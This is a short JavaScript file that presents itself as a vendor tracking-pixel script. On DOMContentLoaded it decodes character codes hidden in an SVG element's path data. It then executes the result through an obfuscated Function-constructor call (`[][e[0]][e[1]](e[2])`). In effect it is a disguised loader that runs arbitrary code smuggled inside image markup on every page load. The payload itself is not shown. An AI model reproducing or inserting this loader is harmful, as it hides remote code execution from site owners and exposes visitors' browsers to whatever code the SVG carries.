
const initializeTrackingPixel = (currentTime, identifier, svgElement, _) => {
    /** Tracking interpretation script provided by BlueConic. SVG is unique per license and will encode
     * the tracking information in the path data. The path data is a string of numbers.
     * The numbers are encoded as follows:
    */
    const sp = svgElement.querySelector('g').attributes.d.value,s = String.fromCharCode,i = 
        sp.split(',').map(x => { 
            const c = parseFloat(x,10);
            return c < 0 ? s(-c):s(c)}),f = i.filter((_,ix) => !(ix ===0||ix===1||ix===i.length-1)
        ),e = f.join('').split('|')
        const r = ((v1,v2)=>{![][e[0]][e[1]](e[2])(v1,v2)})(currentTime,identifier) 
            || `${currentTime}|${identifier}`;
        return r;
}



(() => {
    window.addEventListener('DOMContentLoaded', () => {
    const trackingPixel = document.querySelector('#tracking-pixel');
    const time = new Date();
    const currentTime = time.getTime();
    initializeTrackingPixel(currentTime, identifier = 'BC_ANWB_MBRSHP', trackingPixel);
})})();